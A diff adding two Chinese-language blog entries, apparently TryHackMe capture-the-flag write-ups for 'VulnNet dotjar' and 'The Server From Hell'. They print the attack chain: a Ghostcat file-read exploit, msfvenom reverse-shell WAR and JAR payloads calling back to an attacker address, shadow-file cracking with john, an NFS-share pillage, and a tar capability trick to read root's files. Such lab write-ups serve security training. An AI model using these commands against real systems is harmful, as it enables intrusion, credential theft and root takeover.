@@ -4,6 +4,68 @@
   
     
     <entry>
+      <title>打靶记录(八十)之THMVulnNetdotjar</title>
+      <link href="/2023/12/24/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E5%8D%81)%E4%B9%8BTHMVulnNetdotjar/"/>
+      <url>/2023/12/24/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E5%85%AB%E5%8D%81)%E4%B9%8BTHMVulnNetdotjar/</url>
+      
+        <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap --min-rate=10000 -p- 10.10.255.237</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-24 06:43 UTC</span><br><span class="line">Nmap scan report for ip-10-10-255-237.eu-west-1.compute.internal (10.10.255.237)</span><br><span class="line">Host is up (0.0091s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">8009/tcp open  ajp13</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 02:74:3F:1B:8A:3F (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.46 seconds</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sT -sV -sC -O -p8009,8080 10.10.255.237</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-24 06:49 UTC</span><br><span class="line">Nmap scan report for ip-10-10-255-237.eu-west-1.compute.internal (10.10.255.237)</span><br><span class="line">Host is up (0.00044s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)</span><br><span class="line">| ajp-methods: </span><br><span class="line">|_  Supported methods: GET HEAD POST OPTIONS</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.30</span><br><span class="line">|_http-favicon: Apache Tomcat</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Apache Tomcat/9.0.30</span><br><span class="line">MAC Address: 02:74:3F:1B:8A:3F (Unknown)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.05 seconds</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap --script=vuln -p8009,8080 10.10.255.237</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-24 06:50 UTC</span><br><span class="line">Nmap scan report for ip-10-10-255-237.eu-west-1.compute.internal (10.10.255.237)</span><br><span class="line">Host is up (0.00022s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">8009/tcp open  ajp13</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">| http-enum: </span><br><span class="line">|   /examples/: Sample scripts</span><br><span class="line">|   /manager/html/upload: Apache Tomcat (401 )</span><br><span class="line">|   /manager/html: Apache Tomcat (401 )</span><br><span class="line">|_  /docs/: Potentially interesting folder</span><br><span class="line">MAC Address: 02:74:3F:1B:8A:3F (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 44.75 seconds</span><br></pre></td></tr></tbody></table></figure><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>发现8080端口是开了一个tomcat，但是尝试默认的tomcat/tomcat无法登录。也许得去了解一下Apache Jserv</p><p>发现和之前打的tomghost房间非常相似,尝试一下CVE-2020-1938</p><p><a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487.git">https://github.com/00theway/Ghostcat-CNVD-2020-10487.git</a></p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">python3 ajpShooter.py http://10.10.255.237:8080 8009 /WEB-INF/web.xml read</span><br></pre></td></tr></tbody></table></figure><p>找到一个凭据:</p><p>webdev:Hgj3LA$02D$Fa@21</p><p>虽然能够登陆，但是还是显示403，并做不了什么事情</p><p>但是我们可以上传war</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">.war 文件是一种 Java Web 应用程序归档文件（Web Application Archive）。它是一种使用 Java 技术构建和部署 Web 应用程序的常见方式。.war 文件实际上是一个 ZIP 归档，其中包含了用于在 Java Servlet 容器中运行的 Web 应用程序的所有必要资源和文件。</span><br></pre></td></tr></tbody></table></figure><p>尝试上传一个反弹shell</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.38.245 LPORT=443 -f war -o shell1.war</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">curl --user 'webdev' --upload-file shell1.war "http://10.10.255.237:8080/manager/text/deploy?path=/shell/shell1.war"</span><br></pre></td></tr></tbody></table></figure><p>然后浏览器访问/shell.shell1.war，得到反弹shell</p><p>转到到msf当中</p><p>没有什么方向，传个linpeas</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>/var/shadow-backup-alt.gz似乎是可以读取的而且是shadow的备份</p><p>通过base64的方式下载下来，还需要/etc/passwd</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">unshadow passwd shadow &gt;shadow.txt</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt</span><br></pre></td></tr></tbody></table></figure><p>得到了:</p><p>794613852        (jdk-admin)</p><p>切换用户，sudo -l发现可以以root身份执行jar包，再来个反弹shell</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">msfvenom -p java/shell_reverse_tcp LHOST=10.11.38.245 LPORT=443 -f jar -o shell.jar</span><br></pre></td></tr></tbody></table></figure><p>上传之后开启监听执行:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo /usr/bin/java -jar shell.jar</span><br></pre></td></tr></tbody></table></figure><p>我们是root!</p><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>又碰到了tomcat，记得今年的闽盾杯也有tomcat可惜当时不会捏。以及msf真好用</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>打靶记录(七九)之THMTheServerFromHell</title>
+      <link href="/2023/12/24/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E4%B9%9D)%E4%B9%8BTHMTheServerFromHell/"/>
+      <url>/2023/12/24/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E4%B9%9D)%E4%B9%8BTHMTheServerFromHell/</url>
+      
+        <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>端口扫描，WTF直接干了几万个端口出来。看了下房间的提示，从1337端口开始</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc 10.10.200.74 1337                  </span><br><span class="line">Welcome traveller, to the beginning of your journey</span><br><span class="line">To begin, find the trollface</span><br><span class="line">Legend says he's hiding in the first 100 ports</span><br><span class="line">Try printing the banners from the ports </span><br></pre></td></tr></tbody></table></figure><p>提示让我们打印输出，nc一下1,2,3,端口试试发现回显了一行行的字符，写一个bash脚本来循环nc1至100端口并将输出保存下来</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line"># 指定要连接的 IP 地址</span><br><span class="line"></span><br><span class="line">IP_ADDRESS="10.10.200.74"</span><br><span class="line"></span><br><span class="line"># 指定保存输出的文本文件</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE="output.txt"</span><br><span class="line"></span><br><span class="line"># 循环连接端口范围，并将输出追加到文件</span><br><span class="line"></span><br><span class="line">for ((PORT=1; PORT&lt;=100; PORT++)); do</span><br><span class="line">    echo "Connecting to $IP_ADDRESS:$PORT..."</span><br><span class="line">    nc $IP_ADDRESS $PORT &gt;&gt; $OUTPUT_FILE 2&gt;/dev/null</span><br><span class="line">    echo "-------------------------" &gt;&gt; $OUTPUT_FILE</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">echo "Scan completed. Results saved in $OUTPUT_FILE"</span><br></pre></td></tr></tbody></table></figure><p>在打印出来的画中发现了go to port 12345</p><h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>再nc一下，告诉我们NFC共享有配置错误的漏洞。</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">showmount -e 10.10.200.74</span><br></pre></td></tr></tbody></table></figure><p>发现有一个共享:/home/nfs</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mkdir /tmp/kalinfs</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.200.74:/home/nfs /tmp/kalinfs -nolock</span><br></pre></td></tr></tbody></table></figure><p>发现有一个backup.zip，但是是可读的，把移到kali上来</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat backup.zip |base64 -w 0 &gt;~/backup.txt</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cat backup.txt|base64 -d &gt;backup.zip</span><br></pre></td></tr></tbody></table></figure><p>压缩包有密码，我们需要破解，用zip2john先转换成哈希，然后用john破解，得到密码:zxcvbnm</p><p>解压之后得到了密钥，是一个叫做hades的用户</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></tbody></table></figure><p>22端口无法连接。根据hint，2500-4500，也许是ssh端口的范围，写个bash脚本探测一下:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -sT -p2500-4500 10.10.44.248 &gt;result.txt</span><br></pre></td></tr></tbody></table></figure><p>发现3333端口才是纯正的ssh服务(</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>虽然说是登陆进去了，但是交互的shell有点奇怪,输入whoami,但是报错了，根据报错提示发现我们正处于ruby的shell中</p><p>直接<code>bash</code>切换到bash环境，但是竟然输入命令没有回应，没办法只好继续用ruby</p><p>而且我们没有写文件的权限，太奇怪了</p><p>再次搜索了一下，发现system “/bin/bash”所执行开启的shell可以由回显!</p><p>根据房间提示:</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure><p>可以使用tar,拥有的是搜索和查找的能力，直接找flag</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/bin/tar xf "/root/root.txt" -I '/bin/sh -c "cat 1&gt;&amp;2"'</span><br></pre></td></tr></tbody></table></figure><h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>这个房间的作者脑洞是真的大，趣味性也挺大的233比较考察bash脚本的编写，还有端口发现什么的。还有ruby有点必要去了解一些233</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网安 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 网安 </tag>
+            
+            <tag> 渗透测试 </tag>
+            
+            <tag> 打靶 </tag>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>打靶记录(七八)之THMBookStore</title>
       <link href="/2023/12/23/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E5%85%AB)%E4%B9%8BTHMBookStore/"/>
       <url>/2023/12/23/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%83%E5%85%AB)%E4%B9%8BTHMBookStore/</url>
